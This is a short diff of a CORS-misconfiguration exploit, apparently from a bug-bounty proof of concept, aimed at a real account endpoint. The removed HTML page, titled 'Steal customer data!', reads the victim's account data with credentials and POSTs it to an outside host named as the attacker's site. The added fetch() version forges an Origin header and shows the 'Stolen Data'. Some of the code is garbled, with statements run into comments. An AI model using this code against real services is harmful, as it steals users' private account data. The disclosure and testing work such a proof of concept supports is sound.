@@ -1,4 +1,17 @@
-```jsx
- <!DOCTYPE html>
-<html><body><center><h3>Steal customer data!</h3><html><body><button type='button' onclick='cors()'>Exploit</button><p id='demo'></p><script>function cors() {var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200) {var a = this.responseText; // Sensitive data from niche.co about user accountdocument.getElementById("demo").innerHTML = a;xhttp.open("POST", "http://ontechsmarthomeservices.com/", true);// Sending that data to Attacker's websitexhttp.withCredentials = true;console.log(a);xhttp.send("data="+a);}};xhttp.open("GET", "https://account.acronis.com/v2/account", true);xhttp.withCredentials = true;xhttp.send();}</script></body></html>a
-```
+fetch('https://account.acronis.com/v2/account', {
+  method: 'GET',
+  mode: 'cors',
+  credentials: 'omit', // Use 'omit' or 'include' depending on the app's behavior
+  headers: {
+    'Origin': 'https://ontechsmarthomeservices.com#.account.acronis.com' // Browser might drop #, but the point is the server's response
+  }
+}).then(response => response.text())
+  .then(data => {
+    // This is where you can show the stolen data on your page.
+    // For example, display the JSON response on the screen.
+    document.body.innerHTML = '<h1>Stolen Data:</h1><pre>' + data + '</pre>';
+  })
+  .catch(error => {
+    // Handle any errors
+    document.body.innerHTML = '<h1>Error:</h1><p>' + error + '</p>';
+  });
